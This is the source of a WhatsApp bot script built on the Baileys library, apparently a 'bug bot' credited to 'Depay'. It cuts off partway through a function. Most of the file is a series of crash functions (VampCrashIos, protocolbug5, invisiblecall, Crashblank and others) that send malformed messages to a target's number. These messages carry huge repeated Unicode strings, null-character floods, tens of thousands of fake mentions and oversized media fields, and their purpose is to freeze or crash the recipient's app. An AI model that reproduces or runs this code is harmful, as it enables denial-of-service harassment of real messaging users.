/*
CREDIT DEPAY
*/
require('../setting/config');

const fs = require('fs');
const path = require('path');
const axios = require('axios');
const chalk = require("chalk");
const jimp = require("jimp")
const util = require("util");
const fetch = require("node-fetch");
const FormData = require("form-data");
const moment = require("moment-timezone");
var crypto = require("crypto")
let { randomBytes } = require("crypto")
const { spawn, exec, execSync } = require('child_process');

const { default: baileys, proto, generateWAMessage, downloadAndSaveMediaMessage, useMultiFileAuthState, downloadMediaMessage, generateWAMessageFromContent, generateMessageID, getContentType, prepareWAMessageMedia, downloadContentFromMessage, generateRandomMessageId } = require("@whiskeysockets/baileys");
const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./lib/scraper');
module.exports = depayy = async (depayy, m, chatUpdate, store) => {
try {
// Message type handling
const body = (
  m.mtype === "conversation" ? m.message.conversation :
  m.mtype === "imageMessage" ? m.message.imageMessage.caption :
  m.mtype === "videoMessage" ? m.message.videoMessage.caption :
  m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
  m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
  m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
  m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
  m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
  m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
  m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply?.selectedRowId || m.text :
  ''
);
const budy = (typeof m.text === 'string' ? m.text : '');
const prefa = ["", "!", ".", ",", "🐤", "🗿"];
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : "";
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");

// Database
const premium = JSON.parse(fs.readFileSync("./database/premium.json"))
const unli = JSON.parse(fs.readFileSync("./database/unli.json"))
function getDisplayName(id) {
    let contact = store.contacts[id] || {};
    return contact.name || contact.verifiedName || '@' + id.split('@')[0];
}
const isPremium = premium.includes(m.sender)
const owner2 = JSON.parse(fs.readFileSync("./database/owner.json"))
const isOwner = owner2.includes(m.sender) ? true : m.sender == owner+"@s.whatsapp.net" ? true : m.fromMe ? true : false
const isUnli = unli.includes(m.chat)
// Consta Variable
const sender = m.key.fromMe
  ? (depayy?.user?.id?.split(":")[0] || depayy?.user?.id?.split(":")[0]) + "@s.whatsapp.net"
  : (m.key.participant || m.key.remoteJid);
const senderNumber = sender?.split('@')[0];
const senderName = "@" + senderNumber;
const botNumber = await depayy.decodeJid(depayy.user.id);
const isCmd = typeof body === 'string' && body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(/ +/).shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);
const nomordepay = [
  "628982103547",
];


// Group function
const groupMetadata = isGroup ? await depayy.groupMetadata(m.chat).catch((e) => ({})) : {};
const groupOwner = isGroup ? groupMetadata.owner || "" : "";
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup && Array.isArray(participants)
    ? participants.filter(v => v.admin !== null).map(v => v.id)
    : [];
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const speed = require('performance-now')
const os = require("os")
const tempDir = path.join(__dirname, 'temp');
if (!fs.existsSync(tempDir)) {
  fs.mkdirSync(tempDir);
}

//CONST VIRTEX
const { CrLxTrava } = require("../nika/nika1.js")
const { LagHomeTravas } = require("../nika/nika2.js")
const { AndroTrava } = require("../nika/nika3.js")
const { IpHoneTrash } = require("../nika/nika4.js")
const { ExTndHome } = require("../nika/nika5.js")
const { TeLapeTra } = require("../nika/nika6.js")

//CONST FOTO
const foto = fs.readFileSync('./image/Nika.jpg')
const yuda = fs.readFileSync('./image/Nika1.jpg')
const depaybug = fs.readFileSync('./image/Nika1.jpg')
const pler = fs.readFileSync('./image/musik1.mp3')

// Function
const { smsg, sendGmail, formatSize, isUrl, generateMessageTag, getBuffer, getSizeMedia, runtime, fetchJson, formatp, sleep } = require('./lib/myfunction');

// Time
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')

  //Catbox
async function CatBox(filePath) {
  try {
    if (!fs.existsSync(filePath)) throw new Error("File not found");

    const form = new FormData();
    form.append('reqtype', 'fileupload');
    form.append('fileToUpload', fs.createReadStream(filePath));

    const res = await axios.post('https://catbox.moe/user/api.php', form, {
      headers: form.getHeaders()
    });

    if (res.status === 200 && res.data) {
      return res.data.trim();
    } else {
      throw new Error(`Upload failed with status: ${res.status}`);
    }
  } catch (err) {
    throw new Error(`Upload failed: ${err.message}`);
  }
}

//CONSOLE LOG SEND BUG
async function consolebug(pepec, command, typebug) {
console.log(`
${chalk.inverse('PENGIRIMAN BUG📦')} 
${chalk.yellow.bold(`╔─ > Command: ${command}`)} 
${chalk.yellow.bold(`╠─ > Target: ${pepec}`)} 
${chalk.yellow.bold(`╚─ > Type Bug: ${typebug}`)} 

${chalk.blue.bold(`⪩ Status:`)} ${chalk.green.bold(`Done`)} 
 `)
    }


// Console log
if (m.message) {
  console.log(chalk.hex("#8A2BE2")("NIKA VERSION 9 GEN 2︎ "));
  console.log(chalk.hex("#00FF00")("Created By Depay"));
  console.log(chalk.hex("#8A2BE2")("INFORMATION : "));
  console.log(chalk.hex("#FFD700")("Date : ") + chalk.cyan(new Date().toLocaleString()));
  console.log(chalk.hex("#FFD700")("Message : ") + chalk.white(m.body || m.mtype));
  console.log(chalk.hex("#FFD700")("User Send : ") + chalk.magenta(pushname));
  console.log(chalk.hex("#FFD700")("Number   : ") + chalk.red(senderNumber));
  if (m.isGroup) {
      console.log(chalk.hex("#8A2BE2")("INFO DARI GROUP"));
      console.log(chalk.hex("#FFD700")("Group   : ") + chalk.green(groupName));
      console.log(chalk.hex("#FFD700")("Id Group  : ") + chalk.red(m.chat));
  }
  console.log(chalk.hex("#8A2BE2")("NIKA VERSION 9 GEN 2"));
}

if (global.autoTyping) {
if (command) {
depayy.sendPresenceUpdate('composing', from)
}
}
depayy.autoshalat = depayy.autoshalat ? depayy.autoshalat : {}
	let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? depayy.user.id : m.sender
	let id = m.chat 
    if(id in depayy.autoshalat) {
    return false
    }
    let jadwalSholat = {
    shubuh: '04:18',
    terbit: '05:42',
    dhuha: '06:02',
    dzuhur: '11:32',
    ashar: '14:53',
    magrib: '17:23',
    isya: '18:38',
    }

//FUNCTION UCAPAN
function getGreeting() {
const hours = new Date().getHours();
  if (hours >= 0 && hours < 12) {
    return "Good Morning 🌆";
  } else if (hours >= 12 && hours < 18) {
    return " Good Afternoon 🌇";
  } else {
    return "Good Night 🌌";
  }
}
const greeting = getGreeting();

//KEAMANAN 
/*
const keamanan = 'https://github.com/depay1221/depay.js/raw/refs/heads/main/v9gen2';
const kontributor = JSON.parse(fs.readFileSync("./database/owner.json"))
const isBotRegistered = await isBotNumberRegistered(botNumber);

async function isBotNumberRegistered(botNumber) {
   try {
    const response = await axios.get(keamanan);
    if (!Array.isArray(response.data)) {
     console.error('Data Yang Diterima Tidak Valid: Harus Berupa Array.');
     return false;
    }
    const registeredBotNumbers = response.data;
    return registeredBotNumbers.includes(botNumber);
   } catch (error) {
    console.error('Error Fetching Registered Bot Numbers:', error.message);
    return false;
   }
  }
*/
  
let example = (teks) => {
return `\n ❌
Contoh: ${prefix + command} ${teks}\n`
}

const dbreply = (teks) => { 
depayy.sendMessage(m.chat, { react: { text: "❗",key: m.key,}}); 
databaserep(teks)
    }        
    
const qchanel = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363398216129063@newsletter`,
newsletterName: `Depayy`,
jpegThumbnail: "https://files.catbox.moe/c5b74a.jpg",
caption: 'Depayy',
inviteExpiration: Date.now() + 1814400000
}
}}

const lol = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: foto,
      itemCount: "8888",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `봀 DEPAY...☀`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363369514105242@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}



const qtext = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast"} : {}) },'message': {extendedTextMessage: {text: "depayy" }}}

const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `h4z3rz`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6283862861689:+6283862861689\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}

const totalFitur = () =>{
var mytext = fs.readFileSync("./start/depay.js").toString()
var numUpper = (mytext.match(/case '/g) || []).length
return numUpper
}


//==================[ AWAL FUNCTION BUG ]===================//
async function order(isTarget) {
const msg = generateWAMessageFromContent(isTarget, {
interactiveMessage: {
nativeFlowMessage: {
buttons: [{
name: "review_order",
buttonParamsJson: {
reference_id: Math.random().toString(11).substring(2, 10).toUpperCase(),
order: {
status: "completed",
order_type: "ORDER" },
share_payment_status: true }}],
messageParamsJson: {}}}
}, { userJid: isTarget });
await depayy.relayMessage(isTarget, msg.message, { 
messageId: msg.key.id })}

async function CrashJids(target) {
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_order",
            buttonParamsJson: {
              reference_id: Math.random().toString(11).substring(2, 10).toUpperCase(),
              order: {
                status: "completed",
                order_type: "ORDER"
              },
              share_payment_status: true
            }
          }
        ],
        messageParamsJson: {}
      }
   }
  }, { userJid: target });

  await depayy.relayMessage(target, msg.message, { 
    messageId: msg.key.id 
  });
}
//END BUG CH

//FUNCTION VAMPIRE
           async function VampCrashIos(depayy, target) {
                   try {
                           const IphoneCrash = "𑇂𑆵𑆴𑆿".repeat(60000);
                           await depayy.relayMessage(target, {
                                   locationMessage: {
                                           degreesLatitude: 11.11,
                                           degreesLongitude: -11.11,
                                           name: "iOs Crash          " + IphoneCrash,
                                           url: "https://youtube.com/@iqbhalkeifer25"
                                   }
                           }, {
                                   participant: {
                                           jid: target
                                   }
                           });
                           console.log("Send Bug By Vampire");
                   } catch (error) {
                           console.error("Error Sending Bug:", error);
                   }
           }

async function VampiPhone(depayy, target) {
            try {
                const messsage = {
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                newsletterJid: '33333333333333333@newsletter',
                                newsletterName: "Halo iPhone... ov3rk1ll Is Back" + "ꦾ".repeat(1200000),
                                jpegThumbnail: renlol,
                                caption: "ꦽ".repeat(1200000),
                                inviteExpiration: Date.now() + 1814400000,
                            },
                        },
                    },
                };
                await depayy.relayMessage(target, messsage, {
                    userJid: target,
                });
            }
            catch (err) {
                console.log(err);
            }
        }
        
async function VampCrashCH(target) {
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_order",
            buttonParamsJson: {
              reference_id: Math.random().toString(11).substring(2, 10).toUpperCase(),
              order: {
                status: "completed",
                order_type: "ORDER"
              },
              share_payment_status: true
            }
          }
        ],
        messageParamsJson: {}
      }
   }
  }, { userJid: target }); // Perbaiki dari target ke target

  await depayy.relayMessage(target, msg.message, { 
    messageId: msg.key.id 
  });
}

async function viewOnceLiveLocation(target, participant) {
  const payload = {
    message: {
      viewOnceMessage: {
        message: {
          liveLocationMessage: {
            degreesLatitude: -6.175392,
            degreesLongitude: 106.827153,
            accuracyInMeters: 5,
            speedInMps: 0,
            degreesClockwiseFromMagneticNorth: 0,
            caption: "Live di tengah Monas",
            sequenceNumber: 999,
            timeOffset: 0,
            thumbnail: Buffer.from('', 'base64') // Kosongkan jika tidak pakai gambar
          }
        }
      }
    }
  };

  await depayy.relayMessage(target, payload.message, {
    participant
  });
}

async function protocolbug5(target, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "h4z3rz kill u mdfk 😂!!" + "ោ៝".repeat(10000),
        title: "Finix",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "Depay Anjay Mabar 😂",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "༿༑ᜳᢶ⃟"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await depayy.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await depayy.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}

async function protocolpayment(target, mention) {
  const depayy = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        videoMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
          mimetype: "video/mp4",
          fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
          fileLength: "999999",
          seconds: 999999,
          mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
          caption: "\u0000".repeat(9741),
          height: 999999,
          width: 999999,
          fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
          directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1743742853",
          contextInfo: {
            isSampled: true,
            mentionedJid: ["13135550002@s.whatsapp.net", ...Array.from({
              length: 30000
            }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")]
          },
          streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
          thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
          thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
          thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
          annotations: [{
            embeddedContent: {
              embeddedMusic: {
                musicContentMediaId: "kontol",
                songId: "peler",
                author: "\u0000".repeat(9741),
                title: "\u0000".repeat(9741),
                artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                artistAttribution: "https://www.instagram.com/_u/raldzzxyz_",
                countryBlocklist: true,
                isExplicit: true,
                artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
              }
            },
            embeddedAction: true
          }]
        }
      }
    }
  }, {});
  await depayy.relayMessage("status@broadcast", depayy.message, {
    messageId: depayy.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: {
            jid: target
          },
          content: undefined
        }]
      }]
    }]
  });
  if (mention) {
    const payment0 = {
      key: depayy.key,
      type: 25
    };
    const payment1 = {
      protocolMessage: payment0
    };
    const payment2 = {
      message: payment1
    };
    const payment = {
      groupStatusMentionMessage: payment2
    };
    const paymen10 = {
      tag: "meta",
      attrs: {},
      content: undefined
    };
    paymen10.attrs.is_status_mention = "true";
    const kuntul = {
      additionalNodes: [paymen10]
    };
    await depayy.relayMessage(target, payment, kuntul);
  }
}

async function Crashblank(target) {
const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363321780343299@newsletter",
      newsletterName: "𝐃𝐄𝐏𝐀𝐘𝐘 𝐊𝐈𝐋 𝐘𝐔 😂" + "ោ៝".repeat(10000),
      caption: "𝐍𝐈𝐊𝐀 𝐈𝐒 𝐇𝐄𝐑𝐄" + "ោ៝".repeat(10000),
      inviteExpiration: "999999999"
    }
  };

  await depayy.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null
  });
}

async function SendPairing(target, Ptcp = false) {
  const messageContent = {
    viewOnceMessage: {
      message: {
        nativeFlowResponseMessage: {
          status: true,
          criador: "VenomMods",
          resultado: JSON.stringify({
            type: "md",
            ws: {
              _events: {
                "CB:ib,,dirty": ["Array"]
              },
              _eventsCount: 20,
              _maxListeners: 0,
              url: "wss://web.whatsapp.com/ws/chat",
              config: {
                version: ["Array"],
                browser: ["Array"],
                waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                connectTimeoutMs: 20000,
                keepAliveIntervalMs: 30000,
                logger: {},
                printQRInTerminal: false,
                emitOwnEvents: true,
                defaultQueryTimeoutMs: 60000,
                customUploadHosts: [],
                retryRequestDelayMs: 250,
                maxMsgRetryCount: 5,
                fireInitQueries: true,
                auth: "authData",
                markOnlineOnConnect: true,
                syncFullHistory: false,
                linkPreviewImageThumbnailWidth: 192,
                transactionOpts: "transactionOptsData",
                generateHighQualityLinkPreview: false,
                options: {},
                appStateMacVerification: "appStateMacData",
                mobile: false
              }
            }
          }, null, 2) // JSON stringified for pretty format
        }
      }
    }
  };

  try {
    await depayy.relayMessage(target, messageContent, Ptcp ? {
      participant: {
        jid: target
      }
    } : {});
    console.log("Success Send Pairing to Target");
  } catch (error) {
    console.error("Failed to send Pairing to Target:", error);
  }
}

async function invisiblecall(target, mention = true) {
  let push = [];
  push.push({
    body: proto.Message.InteractiveMessage.Body.fromObject({ text: "𝐃𝐄𝐏𝐀𝐘𝐘" }),
    footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "𝐃𝐄𝐏𝐀𝐘𝐘" }),
    header: proto.Message.InteractiveMessage.Header.fromObject({
      title: "𝐃𝐄𝐏𝐀𝐘𝐘",
      hasMediaAttachment: true,
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
        fileLength: "220051162777600",
        height: 720,
        width: 1280,
        mediaKey: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=",
        fileEncSha256: "w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=",
        directPath:
          "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1737281900",
        jpegThumbnail: { url: "https://files.catbox.moe/ykvioj.jpg" },
        scansSidecar:
          "hLyK402l00WUiEaHXRjYHo5S+Wx+KojJ6HFW9ofWeWn5BeUbwrbM1g==",
        scanLengths: [3537, 10557, 1905, 2353],
        midQualityFileSha256: "gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo=",
      },
    }),
    nativeFlowMessage:
      proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
          {
              name: "call_permission_request",
              buttonParamsJson: JSON.stringify({ status: true, criador: "RaldzzXyz WhatsApp API", versao: "@latest", atualizado: "2025-05-25", suporte: "https://wa.me/5521992999999", comandosDisponiveis: [`XXX`], prefixo: `XXX`, linguagem: null }) + "\u0000".repeat(99999)
          },
          {
              name: "call_permission_request",
              buttonParamsJson: JSON.stringify({ status: true, criador: "RaldzzXyz WhatsApp API", versao: "@latest", atualizado: "2025-05-25", suporte: "https://wa.me/5521992999999", comandosDisponiveis: [`XXX`], prefixo: `XXX`, linguagem: null })
            },
            {
              name: "call_permission_request",
              buttonParamsJson: JSON.stringify({ status: true }) + "\u0000".repeat(99999)
            },
        ],
      }),
  });

  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.create({ text: " " }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              text: "\u2063".repeat(9999),
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              hasMediaAttachment: false,
            }),
            carouselMessage:
              proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                cards: [...push],
              }),
          }),
        },
      },
    },
    {}
  );

  await depayy.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await depayy.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "true" },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function invico2(isTarget) {
const msg = {
    groupInviteMessage: {
      groupJid: "120363370626418572@g.us",
      inviteCode: "974197419741",
      inviteExpiration: "97419741",
      groupName: "𝐃𝐄𝐏𝐀𝐘𝐘" + "ោ៝".repeat(10000),
      caption: "𝐃𝐄𝐏𝐀𝐘𝐘" + "ោ៝".repeat(10000),
      jpegThumbnail: null
    }
  };
  await depayy.relayMessage(isTarget, msg, {
  participant: { jid: isTarget }, 
  messageId: null
  })
}

async function blanks(isTarget) {
    await depayy.sendMessage(
        isTarget,
        {
            document: fs.readFileSync("./package.json"),
            fileName: "𝐍𝐈𝐊𝐀 ☀",
            caption: "𝐍𝐈𝐊𝐀 ☀",
            footer: "Depayy",
            buttons: [
                {
                    buttonId: "X",
                    buttonText: {
                        displayText: "𝐍𝐈𝐊𝐀 ☀" + "\u0000".repeat(100000)
                    },
                    type: 1,
                },
            ],
            headerType: 1,
        },
        {
            quoted: m
        }
    );
}

async function bugdepay4(target) {
  await depayy.relayMessage(
    target,
    {
      paymentInviteMessage: {
        serviceType: "PROPOVERS",
        expiryTimestamp: Date.now() + 5184000000,
      },
    },
    {
      participant: {
        jid: target,
      },
    }
  );
}

async function bugdepay2(target) {
  await depayy.relayMessage(
    target,
    {
      paymentInviteMessage: {
        serviceType: "OS",
        expiryTimestamp: Date.now() + 5184000000,
      },
    },
    {
      participant: {
        jid: target,
      },
    }
  );
}

async function bugdepay3(target) {
  depayy.relayMessage(
    target,
    {
      extendedTextMessage: {
        text: "ꦾ".repeat(55000),
        contextInfo: {
          stanzaId: target,
          participant: target,
          quotedMessage: {
            conversation: "𝐍𝐈𝐊𝐀 ☀" + "ꦾ࣯࣯".repeat(50000),
          },
disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "CHAT_SETTING",
          },
        },
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    },
    {
      paymentInviteMessage: {
        serviceType: "PROPOVERS",
        expiryTimestamp: Date.now() + 5184000000,
      },
    },
    {
      participant: {
        jid: target,
      },
    },
    {
      messageId: null,
    }
  );
}

async function invicXblank(target) {
const msg = {
    groupInviteMessage: {
      groupJid: "120363370626418572@g.us",
      inviteCode: "974197419741",
      inviteExpiration: "97419741",
      groupName: "𝐍𝐈𝐊𝐀☀" + "ោ៝".repeat(10000),
      caption: "𝐍𝐈𝐊𝐀☀" + "ោ៝".repeat(10000),
      jpegThumbnail: null
    }
  };
  await depayy.relayMessage(target, msg, {
  participant: { jid: target }, 
  messageId: null
  })
}

async function Blankhard(target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
